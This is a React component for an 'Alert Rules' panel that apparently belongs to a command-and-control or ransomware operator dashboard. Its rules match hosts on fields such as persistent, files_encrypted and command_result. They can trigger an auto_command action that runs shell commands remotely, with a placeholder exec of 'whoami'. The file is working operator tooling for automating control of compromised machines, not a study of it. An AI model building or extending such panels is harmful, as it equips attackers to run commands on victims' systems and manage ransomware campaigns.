import React, { useState, useEffect, useCallback } from 'react';
import { Plus, Pencil, Trash2, ToggleLeft, ToggleRight, AlertTriangle } from 'lucide-react';

interface AlertRule {
  id: number;
  name: string;
  field: string;
  operator: string;
  value: string;
  action_type: string;
  action_params?: string;
  enabled: boolean;
  created_at: string;
}

const FIELD_OPTIONS = [
  'hostname', 'username', 'os', 'ip', 'status', 'persistent',
  'files_found', 'files_encrypted', 'command_result',
];

const OPERATOR_OPTIONS = ['equals', 'contains', 'starts_with', 'matches', 'gt', 'lt'];

const ACTION_OPTIONS = ['notify_dashboard', 'log', 'auto_command'];

interface AlertRulesProps {
  setToastMessage: (msg: { title: string; message: string; type: 'success' | 'danger' | 'warning' } | null) => void;
}

export const AlertRules: React.FC<AlertRulesProps> = ({ setToastMessage }) => {
  const [rules, setRules] = useState<AlertRule[]>([]);
  const [showForm, setShowForm] = useState(false);
  const [editingId, setEditingId] = useState<number | null>(null);
  const [form, setForm] = useState({
    name: '', field: 'hostname', operator: 'contains', value: '',
    action_type: 'notify_dashboard', action_params: '',
  });

  const fetchRules = async () => {
    try {
      const resp = await fetch('/api/triggers');
      if (resp.ok) setRules(await resp.json());
    } catch {}
  };

  useEffect(() => { fetchRules(); }, []);

  const resetForm = () => {
    setForm({ name: '', field: 'hostname', operator: 'contains', value: '', action_type: 'notify_dashboard', action_params: '' });
    setEditingId(null);
    setShowForm(false);
  };

  const handleSave = async () => {
    if (!form.name || !form.value) return;
    const url = editingId ? `/api/triggers/${editingId}` : '/api/triggers';
    const method = editingId ? 'PUT' : 'POST';
    const body: Record<string, unknown> = { ...form };
    if (form.action_type === 'auto_command' && form.action_params) {
      try {
        body.action_params = JSON.parse(form.action_params);
      } catch {
        setToastMessage({ title: 'INVALID JSON', message: 'action_params must be valid JSON', type: 'danger' });
        return;
      }
    }
    try {
      const resp = await fetch(url, { method, headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
      if (resp.ok) {
        setToastMessage({ title: editingId ? 'RULE UPDATED' : 'RULE CREATED', message: form.name, type: 'success' });
        resetForm();
        fetchRules();
      }
    } catch {}
  };

  const handleEdit = (rule: AlertRule) => {
    setForm({
      name: rule.name, field: rule.field, operator: rule.operator, value: rule.value,
      action_type: rule.action_type,
      action_params: rule.action_type === 'auto_command' ? (rule.action_params || '{}') : '',
    });
    setEditingId(rule.id);
    setShowForm(true);
  };

  const handleDelete = async (id: number) => {
    try {
      await fetch(`/api/triggers/${id}`, { method: 'DELETE' });
      setToastMessage({ title: 'RULE DELETED', message: '', type: 'warning' });
      fetchRules();
    } catch {}
  };

  const handleToggle = async (id: number) => {
    try {
      await fetch(`/api/triggers/${id}/state`, { method: 'POST' });
      fetchRules();
    } catch {}
  };

  return (
    <div className="flex flex-col gap-3">
      <div className="flex items-center justify-between">
        <h3 className="text-[10px] text-slate-500 font-bold uppercase tracking-wider">Alert Rules</h3>
        <button
          onClick={() => { resetForm(); setShowForm(true); }}
          className="flex items-center gap-1.5 px-3 py-1.5 bg-cyan-500/10 border border-cyan-500/30 rounded-lg text-[10px] text-cyan-400 font-bold uppercase tracking-wider hover:bg-cyan-500/20 transition cursor-pointer"
        >
          <Plus className="h-3 w-3" />
          Add Rule
        </button>
      </div>

      {showForm && (
        <div className="bg-slate-900/60 border border-slate-800 rounded-lg p-4 space-y-3">
          <div className="grid grid-cols-2 gap-3">
            <div>
              <label className="text-[9px] text-slate-500 font-bold uppercase tracking-wider block mb-1">Name</label>
              <input value={form.name} onChange={(e) => setForm({ ...form, name: e.target.value })}
                className="w-full bg-slate-950 border border-slate-800 rounded-lg px-2.5 py-1.5 text-xs text-slate-300 font-mono focus:outline-none focus:border-cyan-500/60" />
            </div>
            <div>
              <label className="text-[9px] text-slate-500 font-bold uppercase tracking-wider block mb-1">Field</label>
              <select value={form.field} onChange={(e) => setForm({ ...form, field: e.target.value })}
                className="w-full bg-slate-950 border border-slate-800 rounded-lg px-2.5 py-1.5 text-xs text-slate-300 font-mono focus:outline-none focus:border-cyan-500/60">
                {FIELD_OPTIONS.map(o => <option key={o} value={o}>{o}</option>)}
              </select>
            </div>
            <div>
              <label className="text-[9px] text-slate-500 font-bold uppercase tracking-wider block mb-1">Operator</label>
              <select value={form.operator} onChange={(e) => setForm({ ...form, operator: e.target.value })}
                className="w-full bg-slate-950 border border-slate-800 rounded-lg px-2.5 py-1.5 text-xs text-slate-300 font-mono focus:outline-none focus:border-cyan-500/60">
                {OPERATOR_OPTIONS.map(o => <option key={o} value={o}>{o}</option>)}
              </select>
            </div>
            <div>
              <label className="text-[9px] text-slate-500 font-bold uppercase tracking-wider block mb-1">Value</label>
              <input value={form.value} onChange={(e) => setForm({ ...form, value: e.target.value })}
                className="w-full bg-slate-950 border border-slate-800 rounded-lg px-2.5 py-1.5 text-xs text-slate-300 font-mono focus:outline-none focus:border-cyan-500/60" />
            </div>
            <div>
              <label className="text-[9px] text-slate-500 font-bold uppercase tracking-wider block mb-1">Action</label>
              <select value={form.action_type} onChange={(e) => setForm({ ...form, action_type: e.target.value })}
                className="w-full bg-slate-950 border border-slate-800 rounded-lg px-2.5 py-1.5 text-xs text-slate-300 font-mono focus:outline-none focus:border-cyan-500/60">
                {ACTION_OPTIONS.map(o => <option key={o} value={o}>{o}</option>)}
              </select>
            </div>
            {form.action_type === 'auto_command' && (
              <div>
                <label className="text-[9px] text-slate-500 font-bold uppercase tracking-wider block mb-1">Params (JSON)</label>
                <input value={form.action_params} onChange={(e) => setForm({ ...form, action_params: e.target.value })}
                  placeholder='{"command":"exec","params":{"cmd":"whoami"}}'
                  className="w-full bg-slate-950 border border-slate-800 rounded-lg px-2.5 py-1.5 text-xs text-slate-300 font-mono focus:outline-none focus:border-cyan-500/60" />
              </div>
            )}
          </div>
          <div className="flex gap-2 justify-end">
            <button onClick={resetForm}
              className="px-3 py-1.5 text-xs text-slate-400 hover:text-white transition cursor-pointer">Cancel</button>
            <button onClick={handleSave}
              className="px-4 py-1.5 bg-cyan-500/10 border border-cyan-500/30 rounded-lg text-xs text-cyan-400 font-bold tracking-wider hover:bg-cyan-500/20 transition cursor-pointer">
              {editingId ? 'Update' : 'Create'}
            </button>
          </div>
        </div>
      )}

      <div className="space-y-2">
        {rules.length === 0 && (
          <div className="text-center py-8 text-slate-600 font-mono text-xs italic">
            &lt; No alert rules configured &gt;
          </div>
        )}
        {rules.map((rule) => (
          <div key={rule.id} className="bg-slate-900/40 border border-slate-800 rounded-lg p-3 flex items-center justify-between gap-3">
            <div className="min-w-0 flex-1">
              <div className="flex items-center gap-2">
                <span className={`text-xs font-bold uppercase tracking-wider ${rule.enabled ? 'text-slate-200' : 'text-slate-500'}`}>
                  {rule.name}
                </span>
                {!rule.enabled && <span className="text-[9px] text-slate-600 font-mono">DISABLED</span>}
              </div>
              <p className="text-[10px] text-slate-500 mt-0.5 font-mono">
                {rule.field} {rule.operator} "{rule.value}" → {rule.action_type}
              </p>
            </div>
            <div className="flex items-center gap-1 shrink-0">
              <button onClick={() => handleToggle(rule.id)}
                className="p-1 text-slate-500 hover:text-cyan-400 transition cursor-pointer" title="Toggle">
                {rule.enabled ? <ToggleRight className="h-3.5 w-3.5" /> : <ToggleLeft className="h-3.5 w-3.5" />}
              </button>
              <button onClick={() => handleEdit(rule)}
                className="p-1 text-slate-500 hover:text-primary transition cursor-pointer" title="Edit">
                <Pencil className="h-3.5 w-3.5" />
              </button>
              <button onClick={() => handleDelete(rule.id)}
                className="p-1 text-slate-500 hover:text-rose-400 transition cursor-pointer" title="Delete">
                <Trash2 className="h-3.5 w-3.5" />
              </button>
            </div>
          </div>
        ))}
      </div>
    </div>
  );
};
